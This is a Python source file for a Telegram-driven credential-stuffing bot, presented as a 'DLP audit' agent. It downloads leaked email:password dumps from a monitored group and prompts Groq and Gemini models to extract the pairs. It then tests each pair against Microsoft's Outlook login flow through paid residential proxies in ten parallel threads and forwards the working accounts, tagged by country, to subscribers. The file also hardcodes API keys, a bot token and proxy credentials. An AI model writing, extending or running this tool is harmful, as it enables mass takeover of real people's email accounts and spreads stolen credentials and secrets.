import os
import sys
import time
import threading
import base64
import requests
import asyncio
import concurrent.futures
import random
import json
import re
from urllib.parse import urlparse
import psycopg2
import google.generativeai as genai
try:
    from groq import Groq
except ImportError:
    Groq = None

try:
    from telethon import TelegramClient, events
except ImportError:
    print("❌ Error: Telethon no está instalado. Ejecuta 'pip install telethon'")
    sys.exit(1)

# =======================================================
# CONFIGURACIÓN DEL AGENTE Y BASE DE DATOS
# =======================================================
API_ID = 23099503
API_HASH = "5980c7a831a590bd1e3b58648ce1e1e2"
SESSION_NAME = "vps_agent"
DOWNLOAD_DIR = "incoming_targets"

if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Conexión remota a PostgreSQL en Render
DB_URL = os.environ.get('DATABASE_URL')
if not DB_URL:
    print("❌ FATAL: No se definió 'DATABASE_URL'. Este Agente necesita conectar a Render DB.")
    sys.exit(1)

def get_remote_db_conn():
    return psycopg2.connect(DB_URL, connect_timeout=15)

try:
    conn = get_remote_db_conn()
    conn.close()
    print("✅ Conexión a la Base de Datos Remota (Render) exitosa.")
except Exception as e:
    print(f"❌ Error conectando a BD Remota: {e}")
    sys.exit(1)

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# =======================================================
# GROQ AI ENGINE (Primary Fast-Parser) & GEMINI (Fallback)
# =======================================================
GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyDqns01kwTrg6pIIbD6n_S0WKaXrrvt9vk")
genai.configure(api_key=GEMINI_API_KEY)
gemini_model = genai.GenerativeModel('gemini-2.0-flash')

GROQ_API_KEY = os.environ.get("GROQ_API_KEY", "")
def extract_with_groq(raw_text):
    if not Groq or not GROQ_API_KEY:
        print("⚠️ Groq CLI no configurado o sin API Key. Saltando motor 4...")
        return []
    
    print("⚡ Iniciando Motor 4: Groq AI Fast-Parser (Llama-3)...")
    prompt = """
Eres un experto en ciberseguridad y análisis forense de datos.
A continuación te proporcionaré un volcado de texto "sucio" que contiene credenciales filtradas.
Tu única tarea es extraer TODOS los pares de correo y contraseña válidos que encuentres.
Ignora cualquier IP, fecha, URL, o texto irrelevante.

Reglas ESTRICTAS de salida:
- Devuelve SOLO texto plano.
- Cada línea debe tener un único formato: email:password
- NO incluyas explicaciones, encabezados, markdown ni viñetas.
- Si no encuentras ninguna, devuelve "NONE".

Volcado de texto:
""" + raw_text[:30000]

    try:
        groq_client = Groq(api_key=GROQ_API_KEY)
        chat_completion = groq_client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama3-8b-8192",
            temperature=0,
            max_tokens=4000
        )
        text_out = chat_completion.choices[0].message.content.strip()
        if text_out == "NONE" or not text_out:
            return []
            
        ai_pairs = [line.strip() for line in text_out.split('\n') if ':' in line]
        valid_ai_creds = []
        for pair in ai_pairs:
            parts = pair.split(':', 1)
            if len(parts) == 2 and '@' in parts[0]:
                valid_ai_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
        return valid_ai_creds
    except Exception as e:
        print(f"❌ Error en Groq AI Parser: {e}")
        return []

def extract_with_gemini(raw_text):
    print("🤖 Iniciando Motor 3 de Respaldo: Gemini AI Parser...")
    prompt = """
Eres un experto en ciberseguridad y análisis forense de datos.
A continuación te proporcionaré un volcado de texto "sucio" que contiene credenciales filtradas.
Tu única tarea es extraer TODOS los pares de correo y contraseña válidos que encuentres.
Ignora cualquier IP, fecha, URL, o texto irrelevante.

Reglas ESTRICTAS de salida:
- Devuelve SOLO texto plano.
- Cada línea debe tener un único formato: email:password
- NO incluyas explicaciones, encabezados, markdown ni viñetas.
- Si no encuentras ninguna, devuelve "NONE".

Volcado de texto:
""" + raw_text[:30000]
    try:
        response = gemini_model.generate_content(prompt)
        text_out = response.text.strip()
        if text_out == "NONE" or not text_out:
            return []
            
        ai_pairs = [line.strip() for line in text_out.split('\n') if ':' in line]
        valid_ai_creds = []
        for pair in ai_pairs:
            parts = pair.split(':', 1)
            if len(parts) == 2 and '@' in parts[0]:
                valid_ai_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
        return valid_ai_creds
    except Exception as e:
        print(f"❌ Error en Gemini AI Parser: {e}")
        return []

def generate_exec_summary(total_scanned, total_valid, hits_buffer):
    if not Groq or not GROQ_API_KEY:
        return "⚠️ Sin clave de Groq configurada para reporte AI."
        
    categories = {}
    countries = {}
    for h in hits_buffer:
        cat = h['match']
        cntry = h['country']
        categories[cat] = categories.get(cat, 0) + 1
        countries[cntry] = countries.get(cntry, 0) + 1
        
    stats = f"Archivos Procesados: 1\nCredenciales Crudas: {total_scanned}\nObjetivos Válidos: {total_valid}\nHITS Totales: {len(hits_buffer)}\nPor Categoría: {categories}\nPor País: {countries}"
    
    prompt = f"""
Eres el "Director Oficial de Inteligencia (CISO)" de una operación de ciberseguridad.
Acabamos de terminar una auditoría DLP profunda en servidores externos.
A continuación tienes los datos crudos de la sesión.
Redacta un reporte Ejecutivo MUY CORTO (máximo 4 párrafos cortos), dirigido al "Comandante".
Tono: Militar, profesional, conciso y de alto secreto.
Ignora tecnicismos irrelevantes, céntrate en los números clave, las principales categorías encontradas y de qué países vienen los mayores aciertos. No uses markdown intrincado pero puedes resaltar cosas con asteriscos.
Finaliza recomendando un siguiente paso breve.

DATOS CRUDOS DE LA SESIÓN:
{stats}
"""
    try:
        groq_client = Groq(api_key=GROQ_API_KEY)
        chat_completion = groq_client.chat.completions.create(
            messages=[{"role": "user", "content": prompt}],
            model="llama3-8b-8192",
            temperature=0.3,
            max_tokens=600
        )
        return chat_completion.choices[0].message.content.strip()
    except Exception as e:
        return f"Error generando reporte IA: {e}"

# =======================================================
# MOTOR DE AUDITORÍA DLP LOCAL (VPS Windows)
# =======================================================
class DummyQueue:
    def put(self, item):
        pass # Silenciamos el log detallado por credencial en este nivel para no trabar la consola CMD

def run_local_audit(email, password, proxy_dict, hits_buffer):
    """
    Ejecuta el chequeo de Microsoft Outlook de forma local desde el VPS.
    Si el resultado es HIT, lo anexa a hits_buffer de forma thread-safe.
    """
    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)
        
    mobile_ua = (
        "Mozilla/5.0 (Linux; Android 9; V2218A Build/PQ3B.190801.08041932; wv) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        "Chrome/91.0.4472.114 Mobile Safari/537.36"
    )

    session.headers.update({
        "User-Agent": mobile_ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "upgrade-insecure-requests": "1",
        "x-requested-with": "com.microsoft.outlooklite",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
    })

    auth_url = (
        "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
        "client_info=1&haschrome=1"
        f"&login_hint={email}"
        "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        "&mkt=en&response_type=code"
        "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
    )

    try:
        session.headers.pop("Host", None)
        res1 = session.get(auth_url, verify=False, timeout=20, allow_redirects=True)
        if res1.status_code != 200:
            return
            
        ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
        if not ppft_match:
            ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
        if not ppft_match:
            ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
        
        pl_match = re.search(r'urlPost\s*[\"\']?\s*:\s*[\"\']([^\"\']+)[\"\']', res1.text)
        if not pl_match:
            pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
            
        if not ppft_match or not pl_match:
            return
            
        ppft = ppft_match.group(1)
        post_url = pl_match.group(1)
        
        post_data = {
            "i13": "0", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "3", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
            "passwd": password, "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
            "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": ppft,
            "PPSX": "", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
            "i21": "0", "CookieBream": "", "isFidoSupported": "1", "isSAASupported": "1",
            "isCBAv2Supported": "0", "isCookieBannerShown": "false",
            "isRoamMacSupported": "0", "iSoLP": "0", "i2": "1", "i17": "0", "i18": "", "i19": "24985"
        }
        res2 = session.post(post_url, data=post_data, verify=False, timeout=25, allow_redirects=True)
        if res2.status_code != 200:
            return

        if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
            # ¡HITS POSITIVO!
            profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
            country = "XZ"
            if profile_res.status_code == 200:
                try:
                    p_data = profile_res.json()
                    region = p_data.get('culture', '')
                    if region and '-' in region:
                        country = region.split('-')[-1].upper()
                except:
                    pass
            
            # TLD Fallback Extremo para forzar País
            if country == "XZ":
                try:
                    profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
                    if profile_html_res.status_code == 200:
                        html_text = profile_html_res.text
                        country_match = re.search(r'"Country"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                        if not country_match:
                            country_match = re.search(r'"CountryOrRegion"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
                        if country_match:
                            raw_country = country_match.group(1)
                            country = raw_country[:4].upper() if len(raw_country) > 2 else raw_country.upper()
                except:
                    pass

            if country == "XZ":
                email_lower = email.lower()
                if email_lower.endswith('.es'): country = 'ES'
                elif email_lower.endswith('.mx') or email_lower.endswith('.com.mx'): country = 'MX'
                elif email_lower.endswith('.ar') or email_lower.endswith('.com.ar'): country = 'AR'
                elif email_lower.endswith('.co') or email_lower.endswith('.com.co'): country = 'CO'
                elif email_lower.endswith('.cl') or email_lower.endswith('.cl'): country = 'CL'
                elif email_lower.endswith('.pe') or email_lower.endswith('.com.pe'): country = 'PE'
                elif email_lower.endswith('.ve') or email_lower.endswith('.com.ve'): country = 'VE'
                elif email_lower.endswith('.ec') or email_lower.endswith('.com.ec'): country = 'EC'
                elif email_lower.endswith('.gt') or email_lower.endswith('.com.gt'): country = 'GT'
                elif email_lower.endswith('.cr') or email_lower.endswith('.co.cr'): country = 'CR'
                elif email_lower.endswith('.do') or email_lower.endswith('.com.do'): country = 'DO'
                elif email_lower.endswith('.uy') or email_lower.endswith('.com.uy'): country = 'UY'
                elif email_lower.endswith('.br') or email_lower.endswith('.com.br'): country = 'BR'
                elif email_lower.endswith('.it'): country = 'IT'
                elif email_lower.endswith('.fr'): country = 'FR'
                elif email_lower.endswith('.de'): country = 'DE'
                elif email_lower.endswith('.uk') or email_lower.endswith('.co.uk'): country = 'UK'
                else: 
                    # Default para cuentas genéricas .com que no revelan el país en el profile
                    country = 'US'
            hits_buffer.append({
                "email": email,
                "pass": password,
                "domain": "outlook.com",
                "match": "HOTMAIL HQ",
                "total": 1,
                "country": country,
                "chat_id": "" # Se poblará después en base a los usuarios activos
            })
    except Exception as e:
        pass

def process_file_and_scan(file_path):
    print("📥 Archivo detectado. Iniciando Auditoría DLP automática DESDE EL VPS...")
    hits_buffer = []
    
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            creds_text = f.read()
    except Exception as e:
        print(f"❌ Error leyendo archivo: {e}")
        return
        
    raw_pairs = [line.strip() for line in creds_text.split('\n') if line.strip()]
    valid_creds = []
    for pair in raw_pairs:
        parts = pair.split(':')
        if len(parts) >= 2 and '@' in parts[0]:
            valid_creds.append(f"{parts[0].strip()}:{parts[1].strip()}")
            
    if len(valid_creds) < 3:
        print("⚠️ Formato de archivo complejo detectado. El parser rápido falló.")
        ai_creds = extract_with_groq(creds_text)
        
        if not ai_creds:
            print("🔄 Cayendo al Motor de Respaldo Definitivo (Gemini)...")
            ai_creds = extract_with_gemini(creds_text)
            
        if ai_creds:
            print(f"🧠 Motor AI logró rescatar {len(ai_creds)} objetivos válidos.")
            valid_creds = ai_creds
    
    if not valid_creds:
        print("❌ Error: No se encontraron credenciales válidas ni con el parser estándar ni con la IA.")
        return

    print(f"✅ Procesando {len(valid_creds)} objetivos de forma 100% aislada...")
    
    # ── CARGAR USUARIOS ACTIVOS DE RENDER DB ──
    try:
        conn = get_remote_db_conn()
        cur = conn.cursor()
        cur.execute("SELECT telegram_chat_id FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
        users = cur.fetchall()
        conn.close()
        
        token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
        for row in users:
            cid = row[0]
            msg = f"📥 *NUEVO ARCHIVO DETECTADO (VÍA VPS AGENT)*\nSe encontró un archivo con `{len(valid_creds)}` correos en ASTERA.\n\n⚡ _Iniciando Escáner DLP Turbo Local...\nTe notificaré los HITS cuando termine._"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": msg, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"Error alerting start: {e}")

    def scan_cred_worker(cred):
        email, pwd = cred.split(':', 1)
        iproyal_auth = {
            "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
            "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
        }
        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer)
        time.sleep(random.uniform(0.5, 1.2))

    # 🔥 TURBO MODE: 10 hilos en paralelo ejecutados localmente
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan_cred_worker, valid_creds)
            
    print(f"🏁 Auditoría de {len(valid_creds)} objetivos finalizada en VPS.")

    if hits_buffer:
        print(f"📦 Enviando reporte consolidado de {len(hits_buffer)} HITs únicos a la red...")
        # Multiplicamos el HIT por todos los usuarios suscritos en DB
        final_hits_to_dispatch = []
        try:
            conn = get_remote_db_conn()
            cur = conn.cursor()
            cur.execute("SELECT telegram_chat_id, is_superadmin FROM users WHERE telegram_chat_id IS NOT NULL AND telegram_chat_id != '' AND saved_senders IS NOT NULL AND saved_senders != ''")
            active_users = cur.fetchall()
            conn.close()
            
            super_admins = []
            for row in active_users:
                cid = row[0]
                is_admin = row[1] if len(row) > 1 and row[1] is not None else 0
                if is_admin == 1: 
                    super_admins.append(cid)
                    
                for original_hit in hits_buffer:
                    user_hit_copy = original_hit.copy()
                    user_hit_copy["chat_id"] = cid
                    final_hits_to_dispatch.append(user_hit_copy)
                    
            send_consolidated_report(final_hits_to_dispatch)
            
            if super_admins:
                print("🧠 Generando Reporte de Salud (Llama-3) para Súper Administrador...")
                summary_text = generate_exec_summary(len(raw_pairs), len(valid_creds), hits_buffer)
                token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
                for s_cid in super_admins:
                    try:
                        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                            json={"chat_id": s_cid, "text": f"🧠 *REPORTE DE INTELIGENCIA (GROQ AI)*\n\n{summary_text}", "parse_mode": "Markdown"})
                    except Exception as e: 
                        print(f"Error enviando reporte AI: {e}")
                        
        except Exception as e:
            print(f"❌ Error despachando Hits a usuarios: {e}")
    else:
        print("✅ No se encontraron HITs en este lote.")

def send_consolidated_report(hits):
    user_hits = {}
    for h in hits:
        cid = h['chat_id']
        if cid not in user_hits: user_hits[cid] = []
        user_hits[cid].append(h)
    
    token = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"

    for cid, u_hits in user_hits.items():
        categories = {}
        for h in u_hits:
            cat = h['match']
            if cat not in categories: categories[cat] = []
            categories[cat].append(h)
        
        summary_lines = ["📊 *REPORTE DE AUDITORÍA DLP (AGENT VPS)* 📊", "━━━━━━━━━━━━━━━━━"]
        for cat, items in categories.items():
            summary_lines.append(f"✅ *{cat}*: `{len(items)}` aciertos")
        summary_lines.append("\n📄 _Detalles completos en el archivo adjunto_")

        report_name = f"reporte_hits_{cid}_{int(time.time())}.txt"
        report_path = os.path.join("incoming_targets", report_name)
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write("DLP AUDIT PRO - REPORTE VPS\n")
            f.write("="*40 + "\n\n")
            f.write(f"{'CORREO':<30} | {'CONTRASEÑA':<15} | {'HITS':<6} | {'PAÍS':<4} | {'OBJETIVO'}\n")
            f.write("-" * 80 + "\n")
            for cat, items in categories.items():
                for h in items:
                    pwd = h['pass']
                    if len(pwd) > 15: pwd = pwd[:12] + "..."
                    f.write(f"{h['email']:<30} | {pwd:<15} | {str(h['total']):<6} | {h['country'][:4]:<4} | [{h['match']}]\n")
            f.write("\n")

        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                          json={"chat_id": cid, "text": "\n".join(summary_lines), "parse_mode": "Markdown"})
            with open(report_path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                              data={"chat_id": cid}, files={"document": f})
        except Exception as e:
            print(f"Error enviando reporte bot para {cid}: {e}")

# =======================================================
# TELEGRAM LISTENER (Local Event Loop)
# =======================================================
TARGET_GROUP = os.environ.get("TARGET_GROUP", "")
FILTER_KEYWORD = os.environ.get("FILTER_KEYWORD", "HOTMAIL HQ")

@client.on(events.NewMessage)
async def handler(event):
    if not TARGET_GROUP:
        return
        
    chat = await event.get_chat()
    try:
        chat_id_or_title = getattr(chat, 'title', str(chat.id))
    except:
        chat_id_or_title = str(chat.id)

    chat_username_lower = getattr(chat, 'username', '').lower() if getattr(chat, 'username', '') else ""
    if TARGET_GROUP.lower() not in chat_id_or_title.lower() and TARGET_GROUP.lower() not in chat_username_lower and TARGET_GROUP != str(chat.id):
        return

    if FILTER_KEYWORD:
        msg_text = getattr(event.message, 'message', '') or ''
        has_keyword_in_text = FILTER_KEYWORD.lower() in msg_text.lower()
    else:
        has_keyword_in_text = True 

    if event.message.document:
        doc = event.message.document
        mime = doc.mime_type
        file_name = ""
        for attr in doc.attributes:
            if hasattr(attr, 'file_name'):
                file_name = attr.file_name
                break
                
        if mime == 'text/plain' or file_name.lower().endswith('.txt'):
            if FILTER_KEYWORD and not (has_keyword_in_text or FILTER_KEYWORD.lower() in file_name.lower()):
                print(f"[-] Ignorando archivo '{file_name}' porque no contiene '{FILTER_KEYWORD}'")
                return
                
            print(f"[*] ¡Documento .txt detectado en {TARGET_GROUP}!")
            try:
                local_path = os.path.join(DOWNLOAD_DIR, f"{int(time.time())}_{file_name if file_name else 'lista.txt'}")
                print(f"    -> Descargando a Windows VPS...")
                await client.download_media(event.message, file=local_path)
                print(f"    -> Iniciando Escáner DLP Aislado...")
                
                t = threading.Thread(target=process_file_and_scan, args=(local_path,))
                t.start()
            except Exception as e:
                print(f"Error descargando medio: {e}")

async def main():
    print("══════════════════════════════════════════════════")
    print("  🖥️  VPS WINDOWS: AGENTE DLP INDEPENDIENTE       ")
    print("══════════════════════════════════════════════════")
    
    # Conecta al cliente interactivo (pedirá el código la primera vez)
    await client.connect()
    
    if not await client.is_user_authorized():
        print("⚠️ Esta es la primera vez que ejecutas el Agente en este VPS.")
        print("   Por favor, ingresa tu número de teléfono (ej. +123456789) para vincular Telethon.")
        phone = input("Teléfono: ")
        await client.send_code_request(phone)
        code = input("Ingresa el código que te llegó a Telegram: ")
        await client.sign_in(phone, code)
        print("✅ VPS Autorizado perfectamente. Archivo de sesión creado localmente.")

    if not TARGET_GROUP:
        print("❌ ADVERTENCIA: No definiste 'TARGET_GROUP' en las variables de tu Windows.")
        print("   -> Ejemplo: Escribe en la consola: $env:TARGET_GROUP=\"El_Link_Del_Grupo\" y vuelve a correr.")
        return

    print(f"\n📡 Escuchando 24/7 de forma independiente en: '{TARGET_GROUP}'")
    if FILTER_KEYWORD:
        print(f"🔍 FILTRO ACTIVO: Solo archivos '{FILTER_KEYWORD}'")
    
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nSaliendo del Agente VPS...")
